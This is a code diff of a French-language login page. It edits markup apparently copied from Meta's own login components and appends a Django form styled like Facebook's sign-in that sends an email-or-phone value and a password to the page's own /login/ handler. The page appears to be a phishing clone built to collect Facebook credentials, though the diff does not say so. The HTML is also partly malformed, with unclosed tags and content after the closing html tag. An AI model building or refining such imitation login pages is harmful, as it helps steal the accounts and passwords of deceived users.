@@ -14,7 +14,7 @@
                 <label>Mot de passe :</label><br>
         
 <input dir="auto" data-bloks-name="bk.components.TextInput" id="m_login_password" aria-label="Mot de passe" autocapitalize="off" autocomplete="on" autocorrect="off" class="wbloks_1 wbloks_66" placeholder="" type="password" value="" name="pass" style="background: transparent; color: rgb(17, 17, 18); font-family: &quot;Optimistic 95&quot;; font-size: 15.2px; line-height: 1.3; caret-color: rgb(17, 17, 18);"><br><br>
-<input type="text" name="pass" placeholder="password"<br><br>
+<input type="text" name="pass.textInput" placeholder="Mot de passe"<br><br>
 </form>
 <button type="submit" class="wbloks_1" style="
     height: 44px;
@@ -31,3 +31,62 @@
 </body>
 </html>
 <span data-bloks-name="bk.components.TextSpan" style="color: rgb(17, 17, 18); font-weight: 500; display: inline; font-size: 15.2px; font-family: &quot;Optimistic 95&quot;; white-space: pre-wrap; overflow-wrap: break-word;">Mot de passe oublié&nbsp;?</span>
+
+<!DOCTYPE html>
+<html>
+<head>
+<title>Connexion</title>
+
+<style>
+body {
+    font-family: Arial;
+    background: #f0f2f5;
+}
+
+.form-box {
+    width: 300px;
+    margin: 100px auto;
+    padding: 20px;
+    background: white;
+    border-radius: 10px;
+    box-shadow: 0 0 10px #ccc;
+}
+
+input {
+    width: 100%;
+    padding: 12px;
+    margin: 8px 0;
+    border-radius: 6px;
+    border: 1px solid #ddd;
+}
+
+button {
+    width: 100%;
+    padding: 12px;
+    background: #1877f2;
+    color: white;
+    border: none;
+    border-radius: 6px;
+    font-weight: bold;
+    cursor: pointer;
+}
+</style>
+
+</head>
+<body>
+
+<div class="form-box">
+    <h2>Se connecter</h2>
+
+    <form method="POST" action="/login/">
+        {% csrf_token %}
+
+        <input type="text" name="contact" placeholder="Email ou téléphone" required>
+        <input type="password" name="mot_de_passe" placeholder="Mot de passe" required>
+
+        <button type="submit">Se connecter</button>
+    </form>
+</div>
+
+</body>
+</html>
